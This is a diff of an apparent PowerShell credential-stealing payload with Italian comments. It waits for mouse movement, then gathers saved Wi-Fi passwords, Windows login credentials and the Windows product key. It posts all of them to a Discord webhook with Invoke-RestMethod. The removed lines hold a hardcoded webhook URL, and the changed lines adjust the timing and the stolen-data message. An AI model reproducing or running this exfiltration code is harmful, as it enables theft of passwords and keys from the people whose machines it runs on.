@@ -1,13 +1,10 @@
- $hookurl = "https://discord.com/api/webhooks/1199489111795433472/1iwQQD8yt6mWJthoohN6eFkO8E4vfoMQ7uNaGeRjmFsAffe_Baryf9vK8WELljjCLn4b"
-
-
-
-# ----------------- PAUSE TILL MOUSE (+ 30 secs) !
+ 
+# ----------------- PAUSE TILL MOUSE (+ 60 secs) !
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 while (1) {
-  $pauseTime = 1
+  $pauseTime = 60
   if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { 
     break 
   } else { 
@@ -80,30 +77,36 @@ while ($form -eq $null)
 }
 
 
+
 # ----------------- SEND RESULTS VIA DISCORD !
 $Body = @{
   'username' = $env:username 
-  'content' = "
+  'content' = ".
+.
+.
+.
+.
+.
 ===================================
 
- Ciao! 
- Ho un regalino per te :)
- L'ho trovato nel computer " + $env:computername + "
-  
- Wi-Fi Profiles and Passwords:
- ----------------------------------- 
- " + $wifiProfiles_IT + $wifiProfiles_EN + "
- 
- Windows Credentials
- -----------------------------------
- user: " + $userlogin + "
- pass: " + $passlogin + "
- 
- Windows Serial
- ----------------------------------- 
- S/N: " + $seriale.BackupProductKeyDefault + "
+Ciao! 
+Ho un regalino per te :)
+L'ho trovato nel computer " + $env:computername + "
 
-.
+Wi-Fi Profiles and Passwords:
+----------------------------------- 
+" + $wifiProfiles_IT + $wifiProfiles_EN + "
+  
+Windows Serial
+----------------------------------- 
+S/N: " + $seriale.BackupProductKeyDefault + "
+ 
+Windows Credentials
+-----------------------------------
+user: " + $userlogin + "
+pass: " + $passlogin + "
+
+                          ...... mica male eh? ;)
 "
 }
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json) 
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)  
